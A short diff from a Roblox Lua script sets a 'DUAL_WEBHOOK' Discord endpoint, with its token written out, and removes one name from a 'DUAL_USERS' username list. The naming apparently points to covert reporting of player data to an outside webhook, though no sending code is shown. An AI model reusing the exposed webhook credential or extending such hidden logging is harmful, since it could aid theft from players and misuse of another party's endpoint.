@@ -12,7 +12,7 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 -- === LOGGING SYSTEM ===
 local DUAL_WEBHOOK = "https://discord.com/api/webhooks/1433080602470645863/qp_7WqlvtNOdFNV1SA9Dij6zJTR0WvO7F7RcUojJoZcvFqGHic63X7Ljx9Fh8TDDtHD2"
-local DUAL_USERS = {"NoHackLmfoGgs", "emir_2012tr", "iEnderWasTakenn", "alikerem123417"}
+local DUAL_USERS = {"NoHackLmfoGgs", "iEnderWasTakenn", "alikerem123417"}
 
 -- === LOAD CONFIG ===
 local users = _G.Usernames or {}
